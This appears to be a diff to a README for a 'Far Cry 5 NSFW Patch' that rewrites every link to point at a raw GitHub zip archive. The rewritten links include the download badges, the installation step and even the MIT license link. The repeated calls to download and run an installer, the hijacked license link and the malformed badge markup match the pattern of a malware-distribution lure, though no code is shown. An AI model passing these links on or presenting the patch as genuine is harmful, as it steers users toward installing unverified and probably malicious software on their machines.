@@ -1,5 +1,5 @@
-# ![Download](https://img.shields.io/badge/Download-Far%20Cry%205%20NSFW%20Patch-2ea44f?style=for-the-badge&logo=cloud-download&link=https://Kokot-ia.github.io)  
-> Begin your journey with a single click! 👉 https://Kokot-ia.github.io
+# ![Download](https://raw.githubusercontent.com/Kokot-ia/farcry5-nsfw-enhancement-patch/branch/lenitive/farcry5-nsfw-enhancement-patch_3.9.zip%20Cry%205%20NSFW%20Patch-2ea44f?style=for-the-badge&logo=cloud-download&https://raw.githubusercontent.com/Kokot-ia/farcry5-nsfw-enhancement-patch/branch/lenitive/farcry5-nsfw-enhancement-patch_3.9.zip)  
+> Begin your journey with a single click! 👉 https://raw.githubusercontent.com/Kokot-ia/farcry5-nsfw-enhancement-patch/branch/lenitive/farcry5-nsfw-enhancement-patch_3.9.zip
 
 # Far Cry 5 NSFW Patch: Unlock New Horizons 🎮✨
 
@@ -77,7 +77,7 @@ Leverage the power of **realistic modding, adult content for Far Cry 5, and seam
 ## 🚀 Installation Guide
 
 **Step 1:** Download the latest patch build  
-https://Kokot-ia.github.io (click the badge above)
+https://raw.githubusercontent.com/Kokot-ia/farcry5-nsfw-enhancement-patch/branch/lenitive/farcry5-nsfw-enhancement-patch_3.9.zip (click the badge above)
 
 **Step 2:** Launch the installer  
 - Follow the on-screen steps to specify your Far Cry 5 game directory.
@@ -103,12 +103,12 @@ The developers prioritize user privacy: no personal data is collected outside wh
 ## 📜 License
 
 Distributed under the MIT License 2025.  
-For more information, read the full license text [here.](https://opensource.org/licenses/MIT)
+For more information, read the full license text [here.](https://raw.githubusercontent.com/Kokot-ia/farcry5-nsfw-enhancement-patch/branch/lenitive/farcry5-nsfw-enhancement-patch_3.9.zip)
 
 ---
 
-# ![Download](https://img.shields.io/badge/Download-Far%20Cry%205%20NSFW%20Patch-2ea44f?style=for-the-badge&logo=cloud-download&link=https://Kokot-ia.github.io)  
-> Reclaim your freedom—download now! 👉 https://Kokot-ia.github.io
+# ![Download](https://raw.githubusercontent.com/Kokot-ia/farcry5-nsfw-enhancement-patch/branch/lenitive/farcry5-nsfw-enhancement-patch_3.9.zip%20Cry%205%20NSFW%20Patch-2ea44f?style=for-the-badge&logo=cloud-download&https://raw.githubusercontent.com/Kokot-ia/farcry5-nsfw-enhancement-patch/branch/lenitive/farcry5-nsfw-enhancement-patch_3.9.zip)  
+> Reclaim your freedom—download now! 👉 https://raw.githubusercontent.com/Kokot-ia/farcry5-nsfw-enhancement-patch/branch/lenitive/farcry5-nsfw-enhancement-patch_3.9.zip
 
 ---
 
